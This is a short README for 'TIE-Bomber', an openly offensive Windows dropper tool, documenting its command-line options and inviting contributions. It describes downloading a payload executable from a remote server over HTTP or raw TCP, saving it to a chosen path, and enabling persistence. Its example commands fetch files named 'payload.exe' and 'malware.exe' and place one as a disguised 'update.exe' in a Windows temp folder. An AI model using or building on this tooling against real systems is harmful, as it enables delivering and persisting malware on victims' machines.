# TIE-Bomber Dropper

![img](TIE-Bombers.gif)

## Usage

```
TIE-Bomber.exe -i <IP> -e <EXE> [options]
```

## Required arguments

* `-i <IP>`
  IP address of the server to download the payload from.

* `-e <EXE>`
  Name of the executable to download (e.g., payload.exe).

## Optional arguments

* `-t <TARGET PATH>`
  Full path where the payload should be saved.
  If omitted, name will not be changed.

* `-p <PORT>`
  Port number to connect to (default: 80).

* `-s`
  Use raw TCP sockets instead of HTTP or other protocols.

* `-P`
  Enable persistence only (no download or connect).
  Note: when using `-P`, the `-t` option (target path) is required.

* `-h`
  Print this help message.

## Examples

```
dropper.exe -i 192.168.1.100 -e payload.exe -t C:\Users\Public\drop.exe
dropper.exe -i 10.0.0.2 -e malware.exe -p 9001 -s
dropper.exe -P -t C:\Windows\Temp\update.exe
```

---

# Contributions are highly welcomed!
